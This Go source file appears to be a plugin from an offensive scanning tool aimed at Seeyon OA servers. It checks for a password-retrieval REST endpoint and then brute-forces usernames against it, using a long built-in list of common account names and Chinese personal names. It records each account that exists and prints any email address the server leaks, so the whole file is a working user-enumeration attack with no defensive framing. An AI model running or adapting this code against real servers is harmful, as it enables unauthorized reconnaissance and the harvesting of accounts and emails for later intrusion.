package plugin

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
)

var ValidUsers = make([]string, 0) // 全局变量来存储有效的用户

// CheckEndpointAndBruteForceUser 检查接口并爆破用户名
func CheckEndpointAndBruteForceUser(targetURL string) {
	url := fmt.Sprintf("%s/seeyon/rest/password/retrieve/getEmailByLoginName/info", targetURL)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println(err)
		return
	}

	// 设置请求头部
	applyHeaders(req)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if code, ok := result["code"].(float64); ok {
		if code == 404 {
			fmt.Println("\033[31m接口不存在\033[0m")
			return
		} else if code == 1001 {
			fmt.Println("\033[32m用户爆破接口存在, 开始进行用户名爆破...\033[0m")
			userDict := []string{"admin", "test", "test01", "test1", "test2", "weblogic", "manager", "manage", "user", "guest", "administrator", "account", "super", "superuser", "xiaomi", "huawei", "apple", "360", "qihoo", "1688", "aliyun", "alipay", "www", "web", "webadmin", "webmaster", "anonymous", "jboss", "1", "admin1", "root", "sever", "system", "develop", "developer", "developers", "development", "demo", "device", "devserver", "devsql", "0", "2", "3", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "3com", "4", "5", "6", "7", "8", "9", "ILMI", "a", "zhangwei", "wangwei", "wangfang", "liwei", "lina", "zhangmin", "lijing", "wangjing", "liuwei", "wangxiuying", "zhangli", "lixiuying", "wangli", "zhangjing", "zhangxiuying", "liqiang", "wangmin", "limin", "wanglei", "liuyang", "wangyan", "wangyong", "lijun", "zhangyong", "lijie", "zhangjie", "zhanglei", "wangqiang", "lijuan", "wangjun", "zhangyan", "zhangtao", "wangtao", "liyan", "wangchao", "liming", "liyong", "wangjuan", "liujie", "liumin", "lixia", "lili", "zhangjun", "wangjie", "zhangqiang", "wangxiulan", "wanggang", "wangping", "liufang", "liuyan", "liujun", "liping", "wanghui", "chenjing", "liuyong", "liling", "liguiying", "wangdan", "ligang", "lidan", "wangpeng", "liutao", "chenwei", "zhanghua", "liujing", "litao", "wangguiying", "zhangxiulan", "lihong", "lichao", "liuli", "zhangguiying", "wangyulan", "zhangpeng", "lixiulan", "zhangchao", "wangling", "zhangling", "lihua", "wangfei", "zhangyulan", "wangguilan", "wangying", "liuqiang", "chenxiuying", "liying", "lihui", "limei", "chenyong", "wang", "lifang", "zhangguilan", "libo", "yangyong", "wangxia", "liguilan", "wangbin", "lipeng", "zhangping", "zhanghui", "zhangyu", "liujuan", "libin", "wanghao", "chenjie", "wangkai", "chenli", "chenmin", "wangxiuzhen", "liyulan", "liuxiuying", "zhangbo", "liuguiying", "yangxiuying", "zhangying", "yangli", "zhangjian", "wangbo", "zhanghong", "liudan", "li", "yangjing", "liuchao", "zhangjuan", "yangfan", "liuying", "lixue", "lixiuzhen", "zhang", "wangjian", "liuyulan", "liuhui", "liubo", "zhanghao", "zhangming", "chenyan", "zhangxia", "yangjie", "wangshuai", "wangxue", "yangjun", "zhangxu", "liugang", "wanghua", "yangmin", "wangning", "lining", "liuguilan", "liubin", "chentao", "wangyumei", "wangna", "zhangbin", "chenlong", "lilin", "wangyuzhen", "zhangfengying", "wanghong", "lifengying", "yangyang", "wanglin", "chenying", "chenjun", "liuxia", "chenhao", "zhangkai", "chenfang", "yangtao", "yangbo", "chenhong", "liuhuan", "wangyuying", "chenjuan", "chengang", "zhanglin", "zhangna", "zhangyumei", "wangfengying", "zhangyuying", "lihongmei", "liujia", "liulei", "liupeng", "wangxu", "zhangxue", "liyang", "zhangxiuzhen", "wangmei", "wangjianhua", "liyumei", "liuping", "yangmei", "lifei", "wangliang", "lilei", "lijianhua", "wangyu", "chenling", "zhangjianhua", "liu", "zhangshuai", "lijian", "chenlin", "chenqiang", "zhaojing", "wangcheng", "zhangyuzhen", "chenchao", "chenliang", "liuna", "wangqin", "zhanglanying", "liuchang", "yangyan", "zhangliang", "liyun", "zhangqin", "wanglanying", "liyuzhen", "chenguiying", "yangchao", "zhangmei", "chenping", "liuhong", "zhaowei", "zhangyun", "zhangning", "yanglin", "gaofeng", "wangjianguo", "chenhua", "yanghua", "wangjianjun", "yangliu", "wangshuzhen", "yangfang", "lichunmei", "wanghaiyan", "liuling", "chenchen", "wanghuan", "lidongmei", "zhanglong", "chenbo", "chenlei", "wangyun", "wangfeng", "wangxiurong", "wangrui", "liqin", "liguizhen", "chenpeng", "liufei", "wangxiuyun", "chenming", "wangguirong", "lihao", "wangzhiqiang", "zhangdan", "lifeng", "zhanghongmei", "liufengying", "liyuying", "wangxiumei", "lijia", "wanglijuan", "chenhui", "zhangfang", "wangyuhua", "zhangjianguo", "lilanying", "wangguizhen", "lixiumei", "chenyulan", "chenxia", "liukai", "zhangyuhua", "liuyumei", "liuhua", "libing", "wangdong", "lijianjun", "liuyuzhen", "lijianguo", "yangwei", "liguirong", "wanglong", "chenxiulan", "zhangjianjun", "lixiurong", "liuming", "zhoumin", "zhangxiumei", "lixuemei", "huangwei", "zhanghaiyan", "wangshulan", "lizhiqiang", "yanglei", "zhangxiurong", "liujianhua", "wanglili", "zhaomin", "chenyun", "lihaiyan", "zhangguirong", "likai", "zhangfeng", "liuxiulan", "zhangzhiqiang", "lilong", "lixiuyun", "lixiufang", "lishuai", "lixin", "liuyun", "zhanglili", "zhangxiuyun", "wangshuying", "wangchunmei", "wanghongmei", "chenbin", "liyuhua", "liguifang", "chenfei", "liuhao", "huangxiuying", "liuyuying", "lishuzhen", "huangyong", "zhouwei", "wangxiufang", "wanglihua", "wangdandan", "wangguixiang", "wangkun", "lixiang", "zhangrui", "zhangguizhen", "wangshuhua", "liushuai", "zhangfei", "zhangxiufang", "wangyang", "zhangguifang", "zhanglijuan", "wangrong", "wuxiuying", "yangming", "liguixiang", "mali", "yangxiulan", "yangling", "wangxiuhua", "yangping", "liliang", "lirong", "liguizhi", "wangbing", "wangguifang", "wangming", "chenmei", "zhangchunmei", "wangdongmei", "liufeng", "lixiuhua", "lidandan", "yangxue", "liuyuhua", "maxiuying", "zhanglihua", "zhangshuzhen", "lixiaohong", "wangxin", "wangguizhi", "zhaoli", "zhangxiuhua", "huangmin", "yangjuan", "wangjinfeng", "zhoujie", "chenjianhua", "liumei", "yangguiying", "lishuying", "chenyuying", "yangxiuzhen", "sunxiuying", "zhaojun", "zhaoyong", "liubing", "yangbin", "liwen", "sunwei", "liuguizhen", "liuyu", "liujianjun", "zhangshuying", "lihongxia", "zhaoxiuying", "zhangrong", "zhangfan", "wangjianping", "zhangguizhi", "zhouyong", "zhangkun", "xuwei", "wangguihua", "liuqin", "zhoujing", "xumin", "xujing", "yanghong", "yangziwen", "zhangshulan", "zhangwen", "chenguilan", "zhouli", "lishuhua", "chen", "machao", "liujianguo", "liguihua", "wangfenglan", "lishulan", "chenxiuzhen", "lijun4", "zhangxin", "wangting", "liting", "zhangting", "zhangqian", "liuxin", "wangqian", "liqian", "zhangtingting", "wangtingting", "liuting", "litingting", "liuqian", "zhangnan", "liutingting", "wanglu", "chenxin", "sysytem", "seeyoon", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99"}
			for _, user := range userDict {
				bruteForceUser(targetURL, user)
			}
		}
	}
}

// 对指定用户名进行爆破
func bruteForceUser(targetURL, user string) {
	url := fmt.Sprintf("%s/seeyon/rest/password/retrieve/getEmailByLoginName/%s", targetURL, user)
	req, _ := http.NewRequest("GET", url, nil)
	applyHeaders(req)

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if code, ok := result["code"].(float64); ok {
		switch code {
		case 1001:
			// 用户不存在，不打印
			break
		case 1002:
			fmt.Printf("存在用户:%s\n", user)
			ValidUsers = append(ValidUsers, user) // 将有效用户添加到全局变量中
		case 1003:
			fmt.Printf("存在用户:%s，疑似邮箱: %s\n", user, result["data"].(string))
			ValidUsers = append(ValidUsers, user) // 将有效用户添加到全局变量中
		default:
			// 对于其他未知的代码，打印整个响应体
			fmt.Printf("未知代码: %.0f, 响应体内容: %s\n", code, string(body))
		}
	}
}

// GetValidUsers 返回有效用户列表
func GetValidUsers(targetURL string) []string {
	CheckEndpointAndBruteForceUser(targetURL)
	return ValidUsers
}

func applyHeaders(req *http.Request) {
	req.Header.Add("User-Agent", "Opera/9.61 (Windows NT 5.1; U; ru) Presto/2.1.1")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Cache-Control", "no-cache")
	req.Header.Add("Pragma", "no-cache")
	req.Header.Add("Connection", "close")
}
